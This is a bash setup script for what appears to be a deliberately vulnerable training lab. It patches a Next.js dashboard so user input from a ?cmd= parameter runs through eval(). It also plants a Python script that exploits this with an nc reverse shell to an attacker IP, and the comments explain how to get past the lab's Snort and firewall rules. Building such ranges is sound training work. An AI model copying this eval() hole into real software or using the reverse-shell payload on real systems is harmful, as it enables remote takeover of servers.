#!/bin/bash
# =============================================================================
# ACME IT Corp - Node.js RCE Vulnerability (eval() in dashboard)
# =============================================================================
# Patches the Next.js health dashboard to pass the ?cmd= query parameter
# directly into eval(), enabling arbitrary JavaScript/Node.js execution
# server-side. Also plants Fong Ling's RemoteAccess_v1.py exploit script
# and supporting documentation.
#
# Run independently:  sudo ./vulnerabilities/nodejs_rce.sh
# Called by:          setup.sh
#
# Requires:
#   - services/dashboard.sh must have run first
#   - users/create_users.sh must have run first (fongling account)
#
# ⚠️  CONFLICT: defenses/snort.sh (sid:1000012) fires on /bin/sh in outbound
#     traffic. Reverse shell payloads from this RCE will trigger it.
# ⚠️  CONFLICT: defenses/iptables.sh + ufw.sh block arbitrary outbound ports.
#     Add a temporary allow rule for your listener port if needed.
#
# Exploit example:
#   curl "http://192.168.56.21/health-check?cmd=require('child_process').execSync('id').toString()"
# =============================================================================

set -euo pipefail

echo "[nodejs_rce] Injecting eval() RCE into dashboard..."

# -----------------------------------------------------------------------------
# Overwrite dashboard.js with the vulnerable version
# The only change from the clean version is in getServerSideProps:
#   systemInfo = eval(query.cmd)   <-- this is the vulnerability
# -----------------------------------------------------------------------------
cat > /opt/acme-next-dashboard/pages/dashboard.js << 'EOF'
import React from 'react';

export default function Dashboard({ systemInfo, error, currentUser }) {
  return (
    <div style={{
      backgroundColor: '#0b1220',
      backgroundImage: 'radial-gradient(1000px 600px at 20% 0%, #12224a, #0b1220)',
      minHeight: '100vh',
      color: '#e8eefc',
      fontFamily: 'system-ui, -apple-system, sans-serif',
      padding: '24px',
    }}>
      <div style={{ maxWidth: '980px', margin: '0 auto' }}>

        {/* Header */}
        <div style={{
          display: 'flex', justifyContent: 'space-between', alignItems: 'center',
          padding: '14px 18px', border: '1px solid #223257', borderRadius: '12px',
          background: 'rgba(15, 26, 51, 0.65)', backdropFilter: 'blur(8px)'
        }}>
          <div style={{ fontWeight: 700 }}>
            ACME IT Corp <span style={{
              display: 'inline-block', padding: '2px 8px', borderRadius: '999px',
              border: '1px solid #223257', color: '#9db0d1', fontSize: '12px', marginLeft: '8px'
            }}>internal health portal</span>
          </div>
          <div style={{ fontSize: '14px', color: '#9db0d1' }}>
            User: <span style={{ color: '#6ea8fe' }}>{currentUser}</span>
          </div>
        </div>

        {/* Diagnostic Panel */}
        <div style={{
          marginTop: '18px', padding: '24px', border: '1px solid #223257',
          borderRadius: '12px', background: 'rgba(15, 26, 51, 0.75)'
        }}>
          <h1 style={{ fontSize: '22px', margin: '0 0 10px' }}>System Diagnostics v1.0b</h1>
          <p style={{ color: '#9db0d1', margin: '6px 0 20px', fontSize: '14px' }}>
            Authorized access only. Unauthorized access is prohibited and monitored.
          </p>
          <div style={{ padding: '12px', border: '1px solid #223257', borderRadius: '12px', background: 'rgba(11, 20, 42, 0.5)' }}>
            <h2 style={{ fontSize: '14px', margin: '0 0 8px', textTransform: 'uppercase', color: '#6ea8fe' }}>Diagnostic Output</h2>
            {error ? (
              <pre style={{ background: '#0b142a', padding: '10px', borderRadius: '10px', color: '#ff5555', fontSize: '12px', border: '1px solid #5a2a2a' }}>
                {error}
              </pre>
            ) : (
              <pre style={{ background: '#0b142a', padding: '10px', borderRadius: '10px', color: '#6fcf6f', fontSize: '12px', border: '1px solid #223257' }}>
                {systemInfo || "System standby. Diagnostics active."}
              </pre>
            )}
          </div>
        </div>

        {/* Footer */}
        <div style={{ marginTop: '22px', color: '#9db0d1', fontSize: '12px', textAlign: 'center' }}>
          © 2026 ACME IT Corp • Internal Portal v2.6.14 • <span style={{ color: '#6ea8fe', opacity: 0.8 }}>Built by Next.js</span>
        </div>
      </div>
    </div>
  );
}

export async function getServerSideProps(context) {
  const { query } = context;
  const currentUser = query.user || 'fongling';
  let systemInfo = "System standby. Run diagnostics via the cmd parameter.";

  if (query.cmd) {
    try {
      // ⚠️  INTENTIONAL VULNERABILITY: eval() on user-controlled input
      systemInfo = eval(query.cmd);
    } catch (e) {
      return { props: { error: `Diagnostic Error: ${e.message}`, currentUser } };
    }
  }

  return { props: { systemInfo: String(systemInfo), currentUser } };
}
EOF

# -----------------------------------------------------------------------------
# Rebuild dashboard with the vulnerable version
# -----------------------------------------------------------------------------
cd /opt/acme-next-dashboard
npm run build
systemctl restart acme-health

echo "[nodejs_rce] Dashboard rebuilt with eval() vulnerability."

# -----------------------------------------------------------------------------
# Plant Fong Ling's remote access exploit script
# This Python script automates triggering the eval() RCE to spawn a reverse shell
# -----------------------------------------------------------------------------
cat > /home/fongling/Scripts/RemoteAccess_v1.py << 'EOF'
#!/usr/bin/env python3
import requests
import argparse
import sys

def trigger_maintenance_shell(url, host_ip, port):
    maintenance_payload = (
        f"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;"
        f"cat /tmp/f|/bin/sh -i 2>&1|nc {host_ip} {port} >/tmp/f')"
    )

    params = {"cmd": maintenance_payload}

    try:
        requests.get(url, params=params, timeout=2)
    except requests.exceptions.ReadTimeout:
        print("Signal sent.")
    except Exception as e:
        print(f"Failure: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--my_ip", required=True)
    parser.add_argument("--port", default="4444")

    args = parser.parse_args()

    target_url = args.target
    if not target_url.startswith("http"):
        target_url = f"http://{target_url}/health-check"

    trigger_maintenance_shell(target_url, args.my_ip, args.port)
EOF

chmod +x /home/fongling/Scripts/RemoteAccess_v1.py

# -----------------------------------------------------------------------------
# Plant supporting documentation — gives the scenario narrative context
# -----------------------------------------------------------------------------
cat > /home/fongling/Documents/WFH_Instructions.txt << 'EOF'
Fong,
If you need to work from home this weekend, use the maintenance
script in ~/Scripts. Make sure you have your listener running first.
Don't let Mallory see this—she's still paranoid about the 2010
breach and hates remote shells.
EOF

chown -R fongling:fongling /home/fongling

echo "[nodejs_rce] Fong's RemoteAccess_v1.py planted at /home/fongling/Scripts/"
echo "[nodejs_rce] Exploit usage:"
echo "[nodejs_rce]   python3 /home/fongling/Scripts/RemoteAccess_v1.py \\"
echo "[nodejs_rce]     --target 192.168.56.21 --my_ip <attacker_ip> --port 4444"